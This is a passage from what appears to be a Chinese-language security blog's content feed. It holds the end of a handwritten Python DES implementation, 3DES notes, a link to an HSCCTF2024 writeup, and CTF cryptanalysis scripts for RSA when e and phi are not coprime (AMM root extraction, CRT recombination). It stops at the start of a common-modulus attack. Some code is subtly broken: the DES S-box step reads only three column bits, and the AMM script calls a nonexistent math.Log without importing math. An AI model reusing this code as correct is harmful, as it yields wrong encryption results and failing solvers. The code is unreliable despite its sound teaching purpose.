class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param xor_result: 48位01字符串</span></span><br><span class="line"><span class="string">        :return: 返回32位01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            <span class="comment"># 将48位数据分为6组，循环进行</span></span><br><span class="line">            block = xor_result[i * <span class="number">6</span>:(i + <span class="number">1</span>) * <span class="number">6</span>]</span><br><span class="line">            line = <span class="built_in">int</span>(block[<span class="number">0</span>] + block[<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">            colmn = <span class="built_in">int</span>(block[<span class="number">1</span>:<span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line">            res = <span class="built_in">bin</span>(self.S[i][line*<span class="number">16</span> + colmn])[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) &lt; <span class="number">4</span>:</span><br><span class="line">                res = <span class="string">&#x27;0&#x27;</span> * (<span class="number">4</span> - <span class="built_in">len</span>(res)) + res</span><br><span class="line">            result += res</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iteration</span>(<span class="params">self, bin_plaintext: <span class="built_in">str</span>, key_list: <span class="built_in">list</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param bin_plaintext: 01字符串，64位</span></span><br><span class="line"><span class="string">        :param key_list: 密钥列表，共16个</span></span><br><span class="line"><span class="string">        :return: 进行F函数以及和left异或操作之后的字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        left = bin_plaintext[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">        right = bin_plaintext[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">            next_lift = right</span><br><span class="line">            f_result = self.__f_funtion(right, key_list[i])</span><br><span class="line">            next_right = self.__xor_function(left, f_result)</span><br><span class="line">            left = next_lift</span><br><span class="line">            right = next_right</span><br><span class="line">        bin_plaintext_result = left + right</span><br><span class="line">        <span class="keyword">return</span> bin_plaintext_result[<span class="number">32</span>:] + bin_plaintext_result[:<span class="number">32</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param plaintext: 明文字符串</span></span><br><span class="line"><span class="string">        :return: 密文字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        bin_plaintext = self.str2bin(plaintext)</span><br><span class="line">        bin_plaintext_block = self.__get_block_list(bin_plaintext)</span><br><span class="line">        ciphertext_bin_list = []</span><br><span class="line">        key_list = self.__get_key_list()</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> bin_plaintext_block:</span><br><span class="line">            <span class="comment"># 初代ip置换</span></span><br><span class="line">            sub_ip = self.__substitution(block, self.ip)</span><br><span class="line">            ite_result = self.__iteration(sub_ip, key_list)</span><br><span class="line">            <span class="comment"># 逆ip置换</span></span><br><span class="line">            sub_ip1 = self.__substitution(ite_result, self.ip1)</span><br><span class="line">            ciphertext_bin_list.append(sub_ip1)</span><br><span class="line">        ciphertext_bin = <span class="string">&#x27;&#x27;</span>.join(ciphertext_bin_list)</span><br><span class="line">        result = self.__bin2int(ciphertext_bin)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result).<span class="built_in">hex</span>().upper()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        :param ciphertext: 密文字符串</span></span><br><span class="line"><span class="string">        :return: 明文字符串</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        b_ciphertext = binascii.a2b_hex(ciphertext)</span><br><span class="line">        bin_ciphertext = self.__int2bin(<span class="built_in">list</span>(b_ciphertext))</span><br><span class="line">        bin_plaintext_list = []</span><br><span class="line">        key_list = self.__get_key_list()</span><br><span class="line">        key_list = key_list[::-<span class="number">1</span>]</span><br><span class="line">        bin_ciphertext_block = [bin_ciphertext[i:i + <span class="number">64</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_ciphertext), <span class="number">64</span>)]</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> bin_ciphertext_block:</span><br><span class="line">            sub_ip = self.__substitution(block, self.ip)</span><br><span class="line">            ite = self.__iteration(sub_ip, key_list)</span><br><span class="line">            sub_ip1 = self.__substitution(ite, self.ip1)</span><br><span class="line">            bin_plaintext_list.append(sub_ip1)</span><br><span class="line">        bin_plaintext = <span class="string">&#x27;&#x27;</span>.join(bin_plaintext_list).replace(<span class="string">&#x27;00000000&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.bin2str(bin_plaintext)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self</span>):</span><br><span class="line">        select = <span class="built_in">input</span>(<span class="string">&quot;Please selecting:\n1、Encryption\t 2、Decrpytion\nYour selecting:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> select == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">&quot;Input plaintext：&quot;</span>)</span><br><span class="line">            <span class="comment"># print(&quot;Your plaintext is:&#123;&#125;&quot;.format(plaintext))</span></span><br><span class="line">            ciphertext = self.encode(plaintext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The ciphertext is:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(ciphertext))</span><br><span class="line">        <span class="keyword">elif</span> select == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">&quot;Input ciphertext：&quot;</span>)</span><br><span class="line">            <span class="comment"># print(&quot;Your ciphertext is:&#123;&#125;&quot;.format(plaintext))</span></span><br><span class="line">            plaintext = self.decode(plaintext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The plaintext is:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(plaintext))</span><br><span class="line">            <span class="comment"># print(len(plaintext))</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Please selecting again！&quot;</span>)</span><br><span class="line">            self.main()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mydes = ArrangeSimpleDES()</span><br><span class="line">    mydes.modify_secretkey()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mydes.main()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>另外要说的是，python也有模块可以直接进行des的加解密，但是真要考DES多半不会直接用这个就能出。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import DES</span><br><span class="line">message = b&#x27;&#x27;</span><br><span class="line">key = b&#x27;&#x27;</span><br><span class="line">cipher = DES.new(key, DES.MODE_ECB) #这里使用了ECB模式</span><br><span class="line">ciphertext = cipher.encrypt(message) #加密</span><br><span class="line">print(ciphertext)</span><br><span class="line">plain = cipher.decrypt(ciphertext) #解密</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure><h2 id="des">3DES</h2><p>由于DES的实际密钥长度只有56位，安全性并不高，于是便有了3DES，可以说是对明文进行了3次DES，因此密钥有168位。</p><p>流程如下（图来源<ahref="https://blog.csdn.net/qq_41137136/article/details/86416849">这篇文章</a>）</p><h3 id="des-ede3">DES-EDE3</h3><p>三个密钥都不同时</p><figure><img src="/images/DES加密/2019011314264658.png"alt="2019011314264658" /><figcaption aria-hidden="true">2019011314264658</figcaption></figure><h3 id="des-ede2">DES-EDE2</h3><p>当密钥1、3相同，密钥2不同时</p><figure><img src="/images/DES加密/20190113142411607.png"alt="20190113142411607" /><figcaption aria-hidden="true">20190113142411607</figcaption></figure><p>当三个密钥都相同时，就成了普通的DES</p><h2 id="关于des的攻击">关于DES的攻击</h2><blockquote><p>这里有待补充</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HSCCTF2024 Writeup</title>
      <link href="/posts/86d6019a/"/>
      <url>/posts/86d6019a/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/HSCCTF2024Writeup.pdf">Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HSCCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学算法散记</title>
      <link href="/posts/e61125ce/"/>
      <url>/posts/e61125ce/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这里零散地记载一些密码学可能用到的算法脚本<del>（当裁缝）</del>，方便之后直接拿来用</p></blockquote><h2 id="rsa中的ephi不互素问题">RSA中的e,phi不互素问题</h2><p>参考了<ahref="https://blog.csdn.net/m0_74345946/article/details/133936371">这篇文章</a></p><h3 id="换模">换模</h3><p>当e和p-1或q-1互素时，可以转换到模p或模q下求解</p><p>假设e与p-1互素 <span class="math display">\[m^e\equiv c(mod\ n)\]</span></p><p><span class="math display">\[m^e=c+kpq\]</span></p><p><span class="math display">\[m^e\ mod\ p=c\ mod\ p+kpq\ mod\ p\]</span></p><p><span class="math display">\[m^e\equiv c(mod\ p)\]</span></p><p>python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(e,p-<span class="number">1</span>)==<span class="number">1</span></span><br><span class="line">c=c%p</span><br><span class="line">phi=p-<span class="number">1</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p)</span><br></pre></td></tr></table></figure><h3 id="egcd-irootm2">e//gcd iroot(m,2)</h3><p>当gcd(e,phi)较小时，可以先将e//gcd(e,phi)，使得e和phi互素后，再对算出的m开根</p><p>python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">_gcd=gmpy2.gcd(e,phi)</span><br><span class="line">e=e//_gcd</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=gmpy2.iroot(<span class="built_in">pow</span>(c,d,p),_gcd)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="有限域内开方">有限域内开方</h3><p>有时，当e较小时，我们仍然无法用上面的方法得到m。这时，我们可以使用有限域内开方的方法。</p><p>前面我们已经证明了，当p为素数时，由 <span class="math display">\[m^e\equiv c(mod\ n)\]</span> 可以推知 <span class="math display">\[m^e\equiv c(mod\ p)\]</span> 于是我们可以设法找到所有满足 <span class="math display">\[m^e\equiv x^e\equiv c(mod\ p)\]</span> 的x，以及所有满足 <span class="math display">\[m^e\equiv y^e\equiv c(mod\ q)\]</span> 的y，从而列出 <span class="math display">\[\begin{cases}m\equiv x(mod\ p) \\ m\equiv y(mod\ q)\end{cases}\]</span> 的方程组，通过中国剩余定理（CRT）求解。</p><p>下面是一个利用sagemath的程序实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">c = </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^e-c</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^e-c</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q])</span><br><span class="line">        flag.append(solution)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    m=long_to_bytes(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span><span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然也可以通过观察对算法进行一定的优化，详见上面给出的文章，这里不再赘述。</p><h3 id="amm算法">AMM算法</h3><p>参考了<ahref="https://lov2.netlify.app/rsa_e_phi_not_coprime/">这篇文章</a></p><p>当e比较大的时候，我们可以使用AMM算法，它能够大大提高运算的速度</p><h4 id="原算法">原算法</h4><p>先说明一下AMM算法的原算法，此时e=2，p为奇素数，对于 <spanclass="math display">\[x^2\equiv r(mod\ p)\]</span> 我们先对两边开根 <span class="math display">\[x\equiv r^{\frac{1}{2}}(mod\ p)\]</span> 令p-1=2^{s}t，又由欧拉定理得， <span class="math display">\[r^{\frac{p-1}{2}}\equiv r^{2^{s-1}t}\equiv 1(mod\ p)\]</span></p><h5 id="当s1时">当s=1时，</h5><p><span class="math display">\[r^t\equiv 1(mod\ p)\]</span></p><p>两边同时乘r，再开根，即推出公式 <span class="math display">\[r^{\frac{t+1}{2}}\equiv \pm \sqrt r\equiv \pm x(mod\ p)\]</span> 将m和c代进去，就是这样(t可以根据p算出来) <spanclass="math display">\[\pm m\equiv c^{\frac{t+1}{2}}\]</span></p><h5 id="当s1时-1">当s&gt;1时，</h5><p>如果直接开根我们会得到一正一负两个式子 <span class="math display">\[r^{2^{s-2}t}\equiv 1(mod\ p)\]</span></p><p><span class="math display">\[r^{2^{s-2}t}\equiv -1(mod\ p)\]</span></p><p>由上面得到的 <span class="math display">\[r^{2^{s-1}t}\equiv 1(mod\ p)\]</span> 两边同时乘上这个式子，并用k来控制是否要乘（k=0,1） <spanclass="math display">\[r^{2^{s-2}t}n^{2^{s-1}tk}\equiv 1(mod\ p)\]</span> 就这样反复对两边进行开方操作，直至回到前面s=1的情况，即 <spanclass="math display">\[r^tn^{t*(2k_1+2^2k_2+...+2^{s-1}k_{s-1})}\equiv 1(mod\ p)\]</span> 两边乘上r再开方 <span class="math display">\[r^{\frac{t+1}{2}}n^{t*(k_1+2k_2+...+2^{s-2}k_{s-1})}\equiv\pm  \sqrtr\equiv \pm x(mod\ p)\]</span> 将m和c代进去，得到 <span class="math display">\[c^{\frac{t+1}{2}}n^{t*(k_1+2k_2+...+2^{s-2}k_{s-1})}\equiv \pm m(mod\ p)\]</span></p><h4 id="e2">e&gt;2</h4><p>对于 <span class="math display">\[x^e\equiv r(mod\ p)\]</span> 令p-1=e^{s}t，则有 <span class="math display">\[r^{\frac{p-1}{e}}\equiv r^{e^{s-1}t}\equiv 1(mod\ p)\]</span> 此时可以找到δ，使得t|(eδ-1)，则 <span class="math display">\[r^{e^{s-1}(eδ-1)}\equiv 1(mod\ p)\]</span></p><h5 id="当s1时-2">当s=1时，</h5><p><span class="math display">\[r^{(eδ-1)}\equiv 1(mod\ p)\]</span></p><p>两边乘r，再开e次方 <span class="math display">\[r^\delta\equiv r^{\frac{1}{e}}\equiv x(mod\ p)\]</span></p><h5 id="当s1时-3">当s&gt;1时，</h5><p>构造e次非剩余集合 <span class="math display">\[K_i=\rho^{i*\frac{p-1}{e}}=\rho^{i*e^{s-1}t},0\leq i\leq e-1\]</span></p><p><span class="math display">\[K_i^e=\rho^{i*e^st}=\rho^{i*(p-1)}\]</span></p><p>所以根据欧拉定理，得 <span class="math display">\[\rho^{i*(p-1)}\equiv \rho^{(p-1)}\equiv1(mod\ p)\]</span> 由上面的式子又可以推知 <span class="math display">\[\begin{cases}K_i=\rho^{\frac{i*(p-1)}{e}} \\K_{e-i}=\rho^{\frac{(e-i)*(p-1)}{e}}\end{cases}\]</span></p><p><span class="math display">\[K_i*K_{e-i}=\rho^{p-1}\]</span> 由欧拉定理又可以得到 <span class="math display">\[K_i*K_{e-i}\equiv 1(mod\ p)\]</span> 所以K_i和K_{e-i}互为逆元</p><p>对于前面这个式子 <span class="math display">\[r^{e^{s-1}(eδ-1)}\equiv 1(mod\ p)\]</span> 两边开e次方得到一个集合K中的数设为K_{e-j} <spanclass="math display">\[r^{e^{s-2}(eδ-1)}\equiv K_{e-j}(mod\ p)\]</span> 两边乘上K_j然后开e次方 <span class="math display">\[r^{e^{s-2}(eδ-1)}K_j\equiv K_{e-j}K_j\equiv 1(mod\ p)\]</span></p><p><span class="math display">\[r^{e^{s-2}(eδ-1)}\rho^{j*e^{s-1}t}\equiv 1(mod\ p)\]</span></p><p>反复进行上述操作，直至回到s=1的情况 <span class="math display">\[r^{(eδ-1)}\rho^{ej_1+e^2j_2+...+e^{s-1}j_{s-1}}\equiv 1(mod\ p)\]</span> 两边乘r，开e次方 <span class="math display">\[r^δ\rho^{j_1+ej_2+...+e^{s-2}j_{s-1}}\equiv r^{\frac{1}{e}}\equiv x(mod\p)\]</span> 将m和c代进去，得到 <span class="math display">\[c^δ\rho^{j_1+ej_2+...+e^{s-2}j_{s-1}}\equiv m(mod\ p)\]</span>此时我们便得到了其中一个根，剩余的根可以通过不断乘上集合K得到.</p><p>当我们得到了所有的解以后，使用中国剩余定理对下面的方程组求解即可<span class="math display">\[\begin{cases} m^e\equiv cp(mod\ p) \\ m^e\equiv cq(mod\ q)\end{cases}\]</span> python代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * <span class="comment"># pip install pycryptodome</span></span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="comment"># pip install gmpy2</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm <span class="comment"># pip install tqdm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">onemod</span>(<span class="params">e, q</span>):</span><br><span class="line">    p = random.randint(<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> ((gmpy2.powmod(p, (q - <span class="number">1</span>) // e, q)) == <span class="number">1</span>):</span><br><span class="line">        p = random.randint(<span class="number">1</span>, q)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_rth</span>(<span class="params">x, e, N</span>):</span><br><span class="line">    <span class="keyword">assert</span> ((N - <span class="number">1</span>) % e == <span class="number">0</span>)</span><br><span class="line">    p = onemod(e, N)</span><br><span class="line">    </span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = N - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (s % e == <span class="number">0</span>):</span><br><span class="line">        s = s // e</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((s * k + <span class="number">1</span>) % e != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    delta = (s * k + <span class="number">1</span>) // e</span><br><span class="line"></span><br><span class="line">    a = gmpy2.powmod(p, e ** (t - <span class="number">1</span>) * s, N)</span><br><span class="line">    b = gmpy2.powmod(x, e * delta - <span class="number">1</span>, N)</span><br><span class="line">    c = gmpy2.powmod(p, s ,N)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>, t)):</span><br><span class="line">        d = gmpy2.powmod(b, e ** (t - <span class="number">1</span> -i), N)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (- math.Log(d, a)) % e</span><br><span class="line">        b = b * (c ** (e ** j)) % N</span><br><span class="line">        h = h * (c ** j) % N</span><br><span class="line">        c = c ** e % N</span><br><span class="line">    result = gmpy2.powmod(x, delta, N) * h</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_ROOT2</span>(<span class="params">r, q</span>):  </span><br><span class="line">    list1 = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(list1) &lt; r):</span><br><span class="line">        p = gmpy2.powmod(random.randint(<span class="number">1</span>, q - <span class="number">1</span>), (q - <span class="number">1</span>) // r, q)</span><br><span class="line">        list1.add(p)</span><br><span class="line">    <span class="keyword">return</span> list1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_Solution</span>(<span class="params">m, q, rt, cq, e</span>):</span><br><span class="line">    mp = []</span><br><span class="line">    <span class="keyword">for</span> pr <span class="keyword">in</span> rt:</span><br><span class="line">        r = (pr * m) % q</span><br><span class="line">        mp.append(r)</span><br><span class="line">    <span class="keyword">return</span> mp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">mp, mq, e, p, q</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    t1 = gmpy2.invert(q, p)</span><br><span class="line">    t2 = gmpy2.invert(p, q)</span><br><span class="line">    <span class="keyword">for</span> mp1 <span class="keyword">in</span> mp:</span><br><span class="line">        <span class="keyword">for</span> mq1 <span class="keyword">in</span> mq:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">            ans = (mp1 * t1 * q + mq1 * t2 * p) % (p * q)</span><br><span class="line">            <span class="keyword">if</span> check(ans):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> flag_info <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = </span><br><span class="line">flag_info = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"></span><br><span class="line">mp = AMM_rth(cp, e, p)</span><br><span class="line">mq = AMM_rth(cq, e, q)</span><br><span class="line"></span><br><span class="line">rt1 = ALL_ROOT2(e, p)  </span><br><span class="line">rt2 = ALL_ROOT2(e, q)</span><br><span class="line"></span><br><span class="line">amp = ALL_Solution(mp, p, rt1, cp, e)  </span><br><span class="line">amq = ALL_Solution(mq, q, rt2, cq, e)</span><br><span class="line"></span><br><span class="line">calc(amp, amq, e, p, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;run over&quot;</span>)</span><br></pre></td></tr></table></figure><p>当然，这里还得介绍一下sagemath中有一个很好用的方法.nth_root，可以非常有效地完成域下的高次开根</p><p>大概用法如下，可视情况做出修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">K=Zmod(n)</span><br><span class="line">x=K(c).nth_root(e,<span class="built_in">all</span>=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这样可以返回所有在模n整数环下，满足x^e ≡ c (mod n)的x</p><h2 id="共模攻击">共模攻击</h2><p>用于解决在GF(n)下，明文相同，公钥不同，而模n又很大难以分解的情况（两组公钥和密文已知）<span class="math display">\[\begin{cases}m^{e_1}\equiv c_1(mod\ n) \\ m^{e_2}\equiv c_2(mod\n)\end{cases}\]</span> 两边分别同时乘s1,s2次方 <span class="math 